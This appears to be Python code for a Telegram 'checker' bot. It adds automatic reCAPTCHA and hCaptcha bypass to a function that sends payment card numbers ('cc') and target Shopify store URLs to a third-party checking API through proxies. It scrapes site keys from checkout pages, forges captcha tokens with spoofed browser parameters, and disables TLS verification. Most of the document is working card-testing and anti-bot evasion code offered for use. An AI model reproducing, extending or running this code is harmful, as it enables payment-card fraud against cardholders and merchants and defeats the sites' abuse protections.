# Captcha solver integration for Telegram bot
# Add these functions to your bot file

import re
import random
import time
import requests

# ============================================
# CAPTCHA SOLVER - ADD THESE TO YOUR BOT
# ============================================

CAPTCHA_SOLVER_ENABLED = True
MAX_CAPTCHA_RETRIES = 3
CAPTCHA_RETRY_DELAY = 2

def detect_site_key_from_page(store_url, timeout=10):
    """Detect captcha site key from store page"""
    try:
        if not store_url.startswith(('http://', 'https://')):
            store_url = 'https://' + store_url

        paths_to_check = ['/checkout', '/cart', '/account/login', '']
        session = requests.Session()
        session.verify = False

        for path in paths_to_check:
            try:
                url = requests.compat.urljoin(store_url, path)
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "text/html,application/xhtml+xml",
                }
                response = session.get(url, headers=headers, timeout=timeout)
                if response.status_code == 200:
                    result = parse_captcha_from_html(response.text, store_url)
                    if result and result.get('success'):
                        session.close()
                        return result
            except:
                continue

        session.close()
    except Exception as e:
        print(f"Site key detection error: {e}")

    return {"success": False}


def parse_captcha_from_html(html_content, base_url=""):
    """Parse captcha info from HTML"""
    try:
        # reCAPTCHA patterns
        recaptcha_patterns = [
            r'data-sitekey=["\']([a-zA-Z0-9_-]{40})["\']',
            r'recaptcha/sitekey["\']?\s*:\s*["\']([a-zA-Z0-9_-]{40})["\']',
            r'google\.com/recaptcha/api.*?k=([a-zA-Z0-9_-]{40})',
        ]

        for pattern in recaptcha_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            if matches:
                site_key = matches[0]
                if len(site_key) == 40 and site_key.startswith('6L'):
                    print(f"🎯 Found reCAPTCHA site key: {site_key[:20]}...")
                    return {
                        "success": True,
                        "site_key": site_key,
                        "captcha_type": "recaptcha",
                        "detection_method": "html_parse"
                    }

        # hCaptcha patterns
        hcaptcha_patterns = [
            r'data-sitekey=["\']([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})["\']',
            r'hcaptcha\.com.*?sitekey=["\']([a-f0-9-]{36})["\']',
        ]

        for pattern in hcaptcha_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            if matches:
                site_key = matches[0]
                if len(site_key) == 36:
                    print(f"🎯 Found hCaptcha site key: {site_key}")
                    return {
                        "success": True,
                        "site_key": site_key,
                        "captcha_type": "hcaptcha",
                        "detection_method": "html_parse"
                    }
    except Exception as e:
        print(f"Parse HTML error: {e}")

    return {"success": False}


def solve_recaptcha_v2(site_key, page_url="https://example.com", invisible=True, max_retries=5):
    """Solve reCAPTCHA v2"""
    start_time = time.time()

    for attempt in range(max_retries):
        try:
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            co_value = "aHR0cHM6Ly9jaGVja291dC5zaG9waWZ5LmNvbTo0NDM."

            anchor_params = {
                "ar": str(random.randint(1, 5)),
                "hl": "en",
                "v": "V6_85qpc2Xf2sbe3xTnRte7m",
                "cb": str(int(time.time() * 1000) + random.randint(1000, 9999))
            }

            anchor_url = (
                f"https://www.google.com/recaptcha/api2/anchor?"
                f"ar={anchor_params['ar']}&k={site_key}&co={co_value}"
                f"&hl={anchor_params['hl']}&v={anchor_params['v']}"
                f"&size={'invisible' if invisible else 'normal'}&cb={anchor_params['cb']}"
            )

            headers = {
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml",
            }

            session = requests.Session()
            session.verify = False
            response = session.get(anchor_url, headers=headers, timeout=15)

            if response.status_code == 200:
                token_match = re.search(r'id="recaptcha-token"\s+value="([^"]+)"', response.text)
                if token_match:
                    token = token_match.group(1)

                    reload_data = {
                        "v": "UFwvoDBMjc8LiYc1DKXiAomK",
                        "reason": "q",
                        "c": token,
                        "k": site_key,
                        "co": co_value,
                        "hl": anchor_params['hl'],
                        "size": "invisible" if invisible else "normal",
                        "chr": f"[{random.randint(60,90)},{random.randint(30,60)},{random.randint(80,100)}]",
                        "vh": str(random.randint(7000000000, 8000000000)),
                        "bg": ""
                    }

                    reload_response = session.post(
                        "https://www.google.com/recaptcha/api2/reload",
                        data=reload_data,
                        headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
                        timeout=15
                    )

                    if reload_response.status_code == 200:
                        captcha_token_match = re.search(r'"rresp","([^"]+)"', reload_response.text)
                        if captcha_token_match:
                            captcha_token = captcha_token_match.group(1)
                            if len(captcha_token) > 10:
                                session.close()
                                return {
                                    "success": True,
                                    "token": captcha_token,
                                    "site_key": site_key,
                                    "page_url": page_url,
                                    "captcha_type": "recaptcha",
                                    "time_taken": round(time.time() - start_time, 2),
                                    "attempt": attempt + 1
                                }

            session.close()

        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue

    return {
        "success": False,
        "error": "All retry attempts failed",
        "time_taken": round(time.time() - start_time, 2)
    }


def solve_hcaptcha(site_key, page_url="https://example.com", max_retries=3):
    """Solve hCaptcha"""
    start_time = time.time()

    for attempt in range(max_retries):
        try:
            session = requests.Session()
            session.verify = False
            response = session.post(
                "https://hcaptcha.com/getcaptcha",
                data={
                    "sitekey": site_key,
                    "host": page_url,
                    "hl": "en",
                    "v": "1",
                    "swa": "1"
                },
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                timeout=15
            )

            if response.status_code == 200:
                result = response.json()
                if "key" in result or "token" in result:
                    session.close()
                    return {
                        "success": True,
                        "token": result.get("key") or result.get("token"),
                        "site_key": site_key,
                        "page_url": page_url,
                        "captcha_type": "hcaptcha",
                        "time_taken": round(time.time() - start_time, 2),
                        "attempt": attempt + 1
                    }

            session.close()

        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue

    return {
        "success": False,
        "error": "hCaptcha solving failed",
        "time_taken": round(time.time() - start_time, 2)
    }


def solve_captcha_auto(shop_url, max_retries=3):
    """
    Auto-detect and solve captcha
    Returns captcha token if successful, None if failed
    """
    if not CAPTCHA_SOLVER_ENABLED:
        return None

    for attempt in range(max_retries):
        try:
            # Step 1: Detect site key from page
            detection_result = detect_site_key_from_page(shop_url)

            if not detection_result.get('success'):
                print(f"⚠️ Could not detect captcha type (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(CAPTCHA_RETRY_DELAY)
                continue

            captcha_type = detection_result.get('captcha_type', 'recaptcha')
            site_key = detection_result.get('site_key')

            print(f"✅ Detected {captcha_type} with site key: {site_key[:20]}...")

            # Step 2: Solve based on captcha type
            if captcha_type == 'recaptcha':
                solve_result = solve_recaptcha_v2(site_key, shop_url)
            elif captcha_type == 'hcaptcha':
                solve_result = solve_hcaptcha(site_key, shop_url)
            else:
                print(f"⚠️ Unsupported captcha type: {captcha_type}")
                if attempt < max_retries - 1:
                    time.sleep(CAPTCHA_RETRY_DELAY)
                continue

            if solve_result.get('success'):
                print(f"✅ Captcha solved in {solve_result.get('time_taken', 'N/A')}s")
                return solve_result.get('token')
            else:
                print(f"⚠️ Captcha solve failed: {solve_result.get('error', 'Unknown')}")

            if attempt < max_retries - 1:
                time.sleep(CAPTCHA_RETRY_DELAY)

        except Exception as e:
            print(f"❌ Captcha solving error: {e}")
            if attempt < max_retries - 1:
                time.sleep(CAPTCHA_RETRY_DELAY)

    return None


# ============================================
# MODIFY YOUR check_site() FUNCTION LIKE THIS
# ============================================

def check_site_with_captcha(site, cc, proxy=None):
    """
    Modified check_site function with captcha solving
    Replace your existing check_site() with this
    """
    url = f"https://autoshopify.stormx.pw/index.php?site={site}&cc={cc}"
    
    try:
        if proxy:
            # Try proxy dict method first
            response = check_site_with_proxy_dict(site, cc, proxy)
            if response:
                # Check if response indicates captcha
                response_upper = response.get("Response", "").upper()
                if 'CAPTCHA' in response_upper or 'CAPTCHA_REQUIRED' in response_upper:
                    print(f"\n🚨 Captcha detected in API response!")
                    print(f"🔄 Attempting to solve captcha...")
                    
                    # Extract shop URL from site
                    shop_url = site
                    
                    # Solve captcha
                    captcha_token = solve_captcha_auto(shop_url, max_retries=MAX_CAPTCHA_RETRIES)
                    
                    if captcha_token:
                        print(f"✅ Captcha solved! Token: {captcha_token[:30]}...")
                        # Retry the request with captcha token
                        url_with_captcha = f"{url}&captcha_token={captcha_token}"
                        session = create_session_with_retries()
                        retry_response = session.get(url_with_captcha, timeout=30, verify=False)
                        if retry_response.status_code == 200:
                            print(f"✅ Retry successful with captcha token!")
                            return retry_response.json()
                    else:
                        print(f"⚠️ Captcha solving failed, continuing anyway...")
                
                return response
            
            # If proxy method fails, try without proxy as fallback
            print(f"Proxy failed, trying direct connection for: {site}")
            session = create_session_with_retries()
            response = session.get(url, timeout=30, verify=False)
            if response.status_code == 200:
                return response.json()
        else:
            # No proxy - direct request
            session = create_session_with_retries()
            response = session.get(url, timeout=30, verify=False)
            if response.status_code == 200:
                response_json = response.json()
                
                # Check if response indicates captcha
                response_upper = response_json.get("Response", "").upper()
                if 'CAPTCHA' in response_upper or 'CAPTCHA_REQUIRED' in response_upper:
                    print(f"\n🚨 Captcha detected in API response!")
                    print(f"🔄 Attempting to solve captcha...")
                    
                    # Solve captcha
                    shop_url = site
                    captcha_token = solve_captcha_auto(shop_url, max_retries=MAX_CAPTCHA_RETRIES)
                    
                    if captcha_token:
                        print(f"✅ Captcha solved! Token: {captcha_token[:30]}...")
                        # Retry with captcha token
                        url_with_captcha = f"{url}&captcha_token={captcha_token}"
                        retry_response = session.get(url_with_captcha, timeout=30, verify=False)
                        if retry_response.status_code == 200:
                            print(f"✅ Retry successful with captcha token!")
                            return retry_response.json()
                    else:
                        print(f"⚠️ Captcha solving failed, continuing anyway...")
                
                return response_json
                
    except Exception as e:
        print(f"Check site error: {e}")
    
    return None
